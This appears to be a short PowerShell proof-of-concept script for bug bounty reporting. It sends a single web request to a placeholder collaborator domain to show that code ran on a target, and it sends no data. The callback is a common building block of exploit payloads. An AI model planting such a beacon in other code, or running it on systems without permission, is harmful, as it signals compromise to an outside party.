# Harmless Bug Bounty PoC
# Makes a simple outbound request to prove code execution

$CallbackUrl = "https://your-collaborator-domain.com/poc-test"

try {
    Invoke-WebRequest -Uri $CallbackUrl -UseBasicParsing
    Write-Output "PoC executed successfully. Outbound request sent."
}
catch {
    Write-Output "Request failed: $_"
}
